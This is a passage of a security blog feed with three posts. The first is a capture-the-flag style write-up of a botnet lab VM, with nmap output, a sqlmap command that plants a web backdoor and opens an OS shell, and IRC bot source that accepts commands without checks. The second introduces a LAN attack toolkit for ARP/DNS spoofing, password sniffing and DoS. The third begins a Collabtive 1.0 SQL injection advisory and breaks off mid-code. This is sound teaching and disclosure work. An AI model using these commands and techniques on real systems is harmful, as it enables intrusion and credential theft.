+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198
+</span><span class='line'>Nmap scan report for 192.168.1.198
+</span><span class='line'>Host is up (0.00044s latency).
+</span><span class='line'>Not shown: 65531 closed ports
+</span><span class='line'>PORT     STATE SERVICE VERSION
+</span><span class='line'>22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
+</span><span class='line'>|_2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
+</span><span class='line'>80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
+</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
+</span><span class='line'>| http-title: Site doesn't have a title (text/html).
+</span><span class='line'>|_Requested resource was /index.php?page=main
+</span><span class='line'>111/tcp  open  rpcbind 2-4 (RPC #100000)
+</span><span class='line'>| rpcinfo:
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
+</span><span class='line'>|_  100000  2,3,4        111/udp  rpcbind
+</span><span class='line'>6667/tcp open  irc     IRCnet ircd
+</span><span class='line'>| irc-info: Server: irc.localhost
+</span><span class='line'>| Version: 2.11.2p2. irc.localhost 000A
+</span><span class='line'>| Lservers/Lusers: 0/3
+</span><span class='line'>| Uptime: 0 days, 0:10:37
+</span><span class='line'>| Source host: 192.168.1.147
+</span><span class='line'>|_Source ident: NONE or BLOCKED
+</span><span class='line'>MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
+</span><span class='line'>Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 - 2.6.35 (97%), Linux 2.6.32 - 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 - 2.6.36 (96%), Linux 2.6.23 - 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 - 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 - 2.6.32 (94%)
+</span><span class='line'>No exact OS matches for host (test conditions non-ideal).
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.44 ms 192.168.1.198
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'># Nmap done at Mon Jul  8 02:08:52 2013 -- 1 IP address (1 host up) scanned in 23.34 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg"></p>
+
+<p>Grabbing the request and handing it off to sqlmap, we quickly have a shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&password=blah' -p user --os-shell
+</span><span class='line'>[....]
+</span><span class='line'>[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
+</span><span class='line'>[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
+</span><span class='line'>[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+</span><span class='line'>os-shell&gt; whoami
+</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] a
+</span><span class='line'>command standard output:    'www-data'
+</span><span class='line'>os-shell&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dumping out the kernel and listening services doesn&rsquo;t give us anything new.  A local mysql database was set up, and the root password was found in <code>/var/www/main.php</code>, but we can&rsquo;t UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a <code>/var/www/botsources</code>, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.</p>
+
+<p>At the head of the bot we&rsquo;ve got a bunch of parameters defined; including its connection location and port:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$servers        = "127.0.0.1";
+</span><span class='line'>$ports            = "6667";
+</span><span class='line'>$admins            = "";
+</span><span class='line'>$channels        = "#somechannel";
+</span><span class='line'>$realnames         = "jhl";
+</span><span class='line'>$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
+</span><span class='line'>$chanpass     = "trolol";</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If we attempt to connect to the IRC server and join the channel, we get <code>Cannot join to channel #somechannel (Bad channel key)</code>, which is the result of an incorrect password.  The source code specifies a password, but it doesn&rsquo;t work.  Could the bot be changed?</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg"></p>
+
+<p>Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.</p>
+
+<p>As given above, we have a list of nicknames, a channel, server, and password.  The password doesn&rsquo;t work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>   while(!$SOCKET && ($try &lt;= $maxtryconn)){
+</span><span class='line'>        $server = random($servers);
+</span><span class='line'>        $port     = random($ports);
+</span><span class='line'>        $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
+</span><span class='line'>        $GLOBALS['SOCKET']=$SOCKET;
+</span><span class='line'>        $try++;
+</span><span class='line'>        sleep(1);
+</span><span class='line'>    }
+</span><span class='line'>    if(!$SOCKET) die("Cannot connect to remote host");
+</span><span class='line'>    if ($SOCKET){
+</span><span class='line'>        $GLOBALS['ident']     = $ident    = random($nicknames);
+</span><span class='line'>        $GLOBALS['nick']     = $nick     = random($nicknames);
+</span><span class='line'>        $GLOBALS['realname']= $realname    = random($realnames);
+</span><span class='line'>        SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
+</span><span class='line'>        NICK($nick);
+</span><span class='line'>        print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
+</span><span class='line'>        flush();sleep(1);
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the <code>parser</code> function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }
+</span><span class='line'>    if($pubcalled){
+</span><span class='line'>        if ($typeMsg=="PRIVMSG" && $user && $pubcalled && $pubcmd) {
+</span><span class='line'>            if(function_exists($pubcmd)){
+</span><span class='line'>                $sender = "PRIVMSG ".$dropMsg." "._;
+</span><span class='line'>                $GLOBALS['sender'] = $sender;
+</span><span class='line'>                $arg = str_replace("\r","",$arg);
+</span><span class='line'>                $arg = str_replace("\n","",$arg);
+</span><span class='line'>                $pubcmd($arg);
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Essentially, once parsed, a valid command to the bot appears <code>bot nick | @command | arguments</code>
+It&rsquo;s also of interest that none of this code verifies the authenticity of the request, nor that it&rsquo;s even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.</p>
+
+<p><img class="center" src="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg"></p>
+
+<p>Game over.  Fun image, and looking forward to future botnet scenarios.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[introducing zarp]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/07/02/introducing-zarp/"/>
+    <updated>2013-07-02T23:37:15-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/07/02/introducing-zarp</id>
+    <content type="html"><![CDATA[<p>I&rsquo;ve been quietly developing a local network attack tool for quite a while now, and it&rsquo;s approaching a state I deem &lsquo;presentable&rsquo;.  Bugs are still being ironed out, and tons of features are still planned, but I&rsquo;ve gotten some great feedback over the past few months and decided it was time for an official introductory post.  This post serves as an introduction into the current capabilities of the framework, as well as a timeline for future development and goals.</p>
+
+<p><a href="https://github.com/hatRiot/zarp">zarp</a> is a local network attack toolkit that emphasizes absolute control over local networks.  It&rsquo;s end goal is to provide a very clean, modular, well-defined interface into a network, handing absolute control over to the user.  Over the course of several months, I discovered myself having to harness one too many tools to perform very basic, and what should be, simple network exploitation.  Mind you, zarp is not about exploiting hosts.  It is merely about the manipulation of any and all traffic present on the local network, and allowing the user the ability to view it, manipulate it, and save it in any manner they desire.  I would align zarp more with Ettercap than Metasploit.</p>
+
+<p>zarp is written in Python and makes an attempt to be as modular as possible while maintaining a high level of independence.  As of now, three things are required to run zarp: Python 2.7.x, Linux, and Scapy.  Because of Scapy&rsquo;s age, I&rsquo;ve had to modify the source code explicitly for zarp, and thus Scapy comes packaged with zarp.  I&rsquo;m currently working to replace Scapy entirely and move to Python 3, but this won&rsquo;t be for awhile.  Zarp modules are dynamically loaded at runtime, and a very basic, but useable, interface has been defined.  It is incredibly easy to write a zarp module and get them loaded up into the framework.</p>
+
+<p>zarp&rsquo;s predominant interface is a CLI-driven GUI, as shown:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~/zarp$ sudo ./zarp.py 
+</span><span class='line'>[!] Loaded 35 modules.
+</span><span class='line'>     ____   __   ____  ____
+</span><span class='line'>    (__  ) / _\ (  _ \(  _ '
+</span><span class='line'>     / _/ /    \ )   / ) __/
+</span><span class='line'>    (____)\_/\_/(__\_)(__)
+</span><span class='line'>        [Version 0.1.3]            
+</span><span class='line'>    [1] Poisoners        [5] Parameter
+</span><span class='line'>    [2] DoS Attacks      [6] Services 
+</span><span class='line'>    [3] Sniffers         [7] Sessions 
+</span><span class='line'>    [4] Scanners   
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Each module is loaded into one of six buckets.  These buckets define the traits of the module and its intended use.  Sessions [7] are how sessions are managed.  Zarp allows a user to poison, sniff, and scan as many hosts as your system allows.  This means that all of your network poisoning and sniffing can be performed all in one spot.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; 0 7
+</span><span class='line'>    [Running sessions]
+</span><span class='line'>[1] ARP Spoof
+</span><span class='line'>    [0] 192.168.1.219
+</span><span class='line'>    [1] 192.168.1.49
+</span><span class='line'>[2] Password Sniffer
+</span><span class='line'>    [0] 192.168.1.49
+</span><span class='line'>    |--&gt; Logging to  /tmp/passwords_49.txt
+</span><span class='line'>[3] HTTP Server
+</span><span class='line'>    [0] HTTP Server
+</span><span class='line'>[4] DNS Spoof
+</span><span class='line'>    [0] 192.168.1.219
+</span><span class='line'>    |-&gt; [0] facebook.* -&gt; 192.168.1.42
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>    [1] Stop session
+</span><span class='line'>    [2] View session
+</span><span class='line'>    [3] Start session logger
+</span><span class='line'>    [4] Stop session logger
+</span><span class='line'>
+</span><span class='line'>0) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>As shown, many sessions can be managed from this interface at once.  Each module defines how output is displayed when the user is &lsquo;viewing&rsquo; the session; it could be network traffic, passwords, HTTP requests, and more.  Various sniffers built in allow easy parsing and logging.</p>
+
+<p>Below are some of the built-in modules.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ____   __   ____  ____
+</span><span class='line'>(__  ) / _\ (  _ \(  _ '
+</span><span class='line'> / _/ /    \ )   / ) __/
+</span><span class='line'>(____)\_/\_/(__\_)(__)
+</span><span class='line'>    [Version 0.1.3]            
+</span><span class='line'>[1] Poisoners        [5] Parameter
+</span><span class='line'>[2] DoS Attacks      [6] Services 
+</span><span class='line'>[3] Sniffers         [7] Sessions 
+</span><span class='line'>[4] Scanners   
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; 1
+</span><span class='line'>[1] ARP Spoof
+</span><span class='line'>[2] DNS Spoof
+</span><span class='line'>[3] DHCP Spoof
+</span><span class='line'>[4] NBNS Poison
+</span><span class='line'>[5] LLMNR Spoofer
+</span><span class='line'>[6] ICMP Redirection
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; 0 2
+</span><span class='line'> ____   __   ____  ____
+</span><span class='line'>(__  ) / _\ (  _ \(  _ '
+</span><span class='line'> / _/ /    \ )   / ) __/
+</span><span class='line'>(____)\_/\_/(__\_)(__)
+</span><span class='line'>    [Version 0.1.3]            
+</span><span class='line'>[1] DHCP Starvation
+</span><span class='line'>[2] LAND DoS
+</span><span class='line'>[3] IPv6 Neighbor Discovery Protocol RA DoS
+</span><span class='line'>[4] Nestea DoS
+</span><span class='line'>[5] SMB2 DoS
+</span><span class='line'>[6] TCP SYN
+</span><span class='line'>[7] IPv6 Neighbor Unreachability Detection DoS
+</span><span class='line'>[8] Linux 2.6.36 - 3.2.1 IGMP DoS
+</span><span class='line'>[9] MS13-018 Win7/8 DoS
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; 0 3
+</span><span class='line'> ____   __   ____  ____
+</span><span class='line'>(__  ) / _\ (  _ \(  _ '
+</span><span class='line'> / _/ /    \ )   / ) __/
+</span><span class='line'>(____)\_/\_/(__\_)(__)
+</span><span class='line'>    [Version 0.1.3]            
+</span><span class='line'>[1] HTTP Sniffer
+</span><span class='line'>[2] Password Sniffer
+</span><span class='line'>[3] Traffic Sniffer
+</span><span class='line'>[4] Database Sniffer
+</span><span class='line'>[5] Packet Modifier
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Also included are various router exploits, switch flooding, ARP shells, access point cracking, and more.  Zarp also allows modules to set CLI options, which can be used like any regular CLI application:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~/zarp$ sudo ./zarp.py --help
+</span><span class='line'>[!] Loaded 35 modules.
+</span><span class='line'>     ____   __   ____  ____
+</span><span class='line'>    (__  ) / _\ (  _ \(  _ '
+</span><span class='line'>     / _/ /    \ )   / ) __/
+</span><span class='line'>    (____)\_/\_/(__\_)(__)
+</span><span class='line'>        [Version 0.1.3]            
+</span><span class='line'>usage: zarp.py [-h] [-q FILTER] [--update] [--wap] [--ftp] [--http] [--smb]
+</span><span class='line'>               [--ssh] [--telnet] [-w] [-s] [--service-scan]
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help      show this help message and exit
+</span><span class='line'>  -q FILTER       Generic network sniff
+</span><span class='line'>  --update        Update Zarp
+</span><span class='line'>
+</span><span class='line'>Services:
+</span><span class='line'>  --wap           Wireless access point
+</span><span class='line'>  --ftp           FTP server
+</span><span class='line'>  --http          HTTP Server
+</span><span class='line'>  --smb           SMB Service
+</span><span class='line'>  --ssh           SSH Server
+</span><span class='line'>  --telnet        Telnet server
+</span><span class='line'>
+</span><span class='line'>Scanners:
+</span><span class='line'>  -w              Wireless AP Scan
+</span><span class='line'>  -s              Network scanner
+</span><span class='line'>  --service-scan  Service scanner
+</span><span class='line'>bryan@devbox:~/zarp$ sudo ./zarp.py --ssh
+</span><span class='line'>[!] Loaded 35 modules.
+</span><span class='line'>     ____   __   ____  ____
+</span><span class='line'>    (__  ) / _\ (  _ \(  _ '
+</span><span class='line'>     / _/ /    \ )   / ) __/
+</span><span class='line'>    (____)\_/\_/(__\_)(__)
+</span><span class='line'>        [Version 0.1.3]            
+</span><span class='line'>[!] Starting SSH Server...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The idea behind services is this: honeypots are scary effective at what they do because they exploit a certain trust a user has in a system, or address.  But, if I&rsquo;m able to DoS a web server, ARPP/DNS spoof the host into redirecting it to me, I can fetch credentials off them just by presenting a login.  These can be leveraged in any number of ways, including spoofing, social engineering, etc.</p>
+
+<p>I realize that many of these attacks are not bleeding-edge; that&rsquo;s okay, for now.  I needed a solid foundation full of tried-and-true attacks that I can then expand upon; for this reason, I&rsquo;ve gone for breadth over depth, initially.  Modules are still being actively developed and features piled on.  zarp is currently lacking a few key features, such as packet modification and ssl stripping, but these are currently in development.  Moxie&rsquo;s sslstrip is fantastic, but I would prefer a native implementation without relying on twisted.</p>
+
+<p>Now comes the future; what&rsquo;s the end-goal for zarp.  I see zarp as a master control system for a local network.  Plug it in and watch it grow.  Recently I&rsquo;ve added a database logging tool that formats certain key bits, username/passwords, hosts, logs, etc., and inserts them into a local sqlite3 database.  This will be expanded to eventually allow connections to postgresql/mysql servers for remote work and collaboration.  The idea behind this is to allow a web application the ability to aggregate everything zarp spits out and organize, analyze, and display this in a very powerful way.  This web application presents network topologies, host relationships, active connections, man-in-the-middle attacks, and more.  The television to zarp&rsquo;s remote control.</p>
+
+<p>Though ambitious, I feel this could be an incredibly powerful tool that provides pentesters an invaluable service.  I&rsquo;m hoping this post garners a few users who can provide solid usage feedback and help iron out bugs or develop features; if you like what you&rsquo;ve seen, please check out the wiki or send me an email (drone AT ballastsecurity DOT net) or tweet (@dronesec).  Any and all feedback, including suggestions/bugs/questions, are welcome.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Collabtive 1.0 - SQLi]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/"/>
+    <updated>2013-06-21T23:40:53-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli</id>
+    <content type="html"><![CDATA[<p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>
+
+<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> if (!empty($start) and !empty($end)) {
+</span><span class='line'>        $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
+</span><span class='line'>    } elseif (is_array($fproject)) {
+</span><span class='line'>        foreach ($fproject as $fpro) {
+</span><span class='line'>            $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
+</span><span class='line'>            if (!empty($ptrack)) {
+</span><span class='line'>                foreach ($ptrack as $mytrack) {
+</span><span class='line'>                    array_push($track, $mytrack);
+</span><span class='line'>                }
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>    } </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Of interest is the <code>getUserTrack</code> function, as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)
+</span><span class='line'>    {
+</span><span class='line'>        global $conn;
+</span><span class='line'>        $user = (int) $user;
+</span><span class='line'>        $project = (int) $project;
+</span><span class='line'>        $lim = (int) $lim;
+</span><span class='line'>
+</span><span class='line'>        if ($project &gt; 0) {
+</span><span class='line'>            $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
+</span><span class='line'>            $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
+</span><span class='line'>            $order = " ORDER BY ended ASC";
+</span><span class='line'>        } else {
+</span><span class='line'>            $sql = "SELECT * FROM timetracker WHERE user = $user";
+</span><span class='line'>            $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
+</span><span class='line'>            $order = " ORDER BY ended ASC";
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        if ($task &gt; 0) {
+</span><span class='line'>            $sql .= " AND task = $task";
+</span><span class='line'>            $num .= " AND task = $task";
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        if ($start &gt; 0 and $end &gt; 0) {
+</span><span class='line'>            $start = strtotime($start);
+</span><span class='line'>            $end = strtotime($end . " +1 day");
+</span><span class='line'>            $end = $end - 1;
+</span><span class='line'>            $sql .= " AND ended &gt;=$start AND ended&lt;=$end ";
+</span><span class='line'>            $num .= " AND ended &gt;=$start AND ended&lt;=$end ";
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        if ($num) {
